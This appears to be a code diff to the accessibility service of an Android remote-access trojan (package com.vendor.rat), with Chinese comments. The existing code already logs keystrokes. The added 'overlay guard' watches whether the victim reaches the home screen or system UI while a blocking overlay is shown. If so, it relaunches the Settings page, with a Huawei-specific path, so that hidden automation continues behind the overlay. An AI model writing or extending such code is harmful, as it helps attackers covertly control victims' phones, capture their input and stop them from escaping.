@@ -15,6 +15,7 @@ import com.vendor.rat.MainApplication;
 import com.vendor.rat.auto.engine.AutoEngine;
 import com.vendor.rat.auto.entity.UiNode;
 import com.vendor.rat.config.AppConfig;
+import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.keepalive.thread.StrategyThread;
 
 import java.io.File;
@@ -477,6 +478,16 @@ public class MyAccessibilityService extends AccessibilityService {
             dispatchKeylogEvent(event);
         }
 
+        // 遮罩防护: 遮罩显示期间检测 launcher/systemui 出现 → 重启设置页恢复自动化
+        // systemui 在前 (字符串比较更廉价)，launcher 在后 (首次需查询 PackageManager)
+        if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
+            && BlockViewHelper.isShowing()
+            && ("com.android.systemui".equals(pkg) || isLauncherPackage(pkg))
+            && overlayGuardFired.compareAndSet(false, true)) {
+            restoreSettingsTask();
+            Log.d(TAG, "Overlay guard: restored settings task, interrupted by " + pkg);
+        }
+
         if (!f227l.tryLock()) {
             Log.e(TAG, "onAccessibilityEvent 事件被忽略:" + (event != null ? event.toString() : "null"));
             return;
@@ -554,6 +565,66 @@ public class MyAccessibilityService extends AccessibilityService {
         } catch (Exception e) {
             Log.e(TAG, "U error", e);
             return false;
+        }
+    }
+
+    /**
+     * 遮罩防护: 防止 restoreSettingsTask 重复触发 (每次遮罩显示周期只触发一次)
+     * 在 BlockViewHelper.show() 前由 StrategyThread 重置
+     */
+    private final AtomicBoolean overlayGuardFired = new AtomicBoolean(false);
+
+    /** 重置遮罩防护状态 (遮罩移除后调用) */
+    public void resetOverlayGuard() {
+        overlayGuardFired.set(false);
+    }
+
+    /**
+     * 检查包名是否为设备默认 Launcher (缓存结果避免重复查询 PackageManager)
+     */
+    private volatile String cachedLauncherPackage;
+
+    private boolean isLauncherPackage(String packageName) {
+        if (packageName == null) return false;
+        if (cachedLauncherPackage == null) {
+            try {
+                Intent homeIntent = new Intent(Intent.ACTION_MAIN);
+                homeIntent.addCategory(Intent.CATEGORY_HOME);
+                android.content.pm.ResolveInfo info = getPackageManager().resolveActivity(homeIntent, 0);
+                cachedLauncherPackage = (info != null) ? info.activityInfo.packageName : "";
+            } catch (Exception e) {
+                return false;
+            }
+        }
+        return packageName.equals(cachedLauncherPackage);
+    }
+
+    /**
+     * 遮罩防护: 重新启动设置页面恢复自动化 task
+     *
+     * 华为: HWSettings → 通用 Settings fallback → RECENTS 兜底
+     * 非华为: 通用 Settings → RECENTS 兜底
+     */
+    private void restoreSettingsTask() {
+        try {
+            if (com.vendor.rat.utils.DeviceUtils.isHuawei()) {
+                try {
+                    Intent hwIntent = new Intent();
+                    hwIntent.setClassName("com.android.settings",
+                        "com.android.settings.HWSettings");
+                    hwIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+                    startActivity(hwIntent);
+                    return;
+                } catch (Exception e) {
+                    Log.w(TAG, "HWSettings launch failed, trying generic settings", e);
+                }
+            }
+            Intent settingsIntent = new Intent(android.provider.Settings.ACTION_SETTINGS);
+            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+            startActivity(settingsIntent);
+        } catch (Exception e) {
+            performGlobalAction(GLOBAL_ACTION_RECENTS);
+            Log.w(TAG, "restoreSettingsTask fallback to RECENTS", e);
         }
     }
 
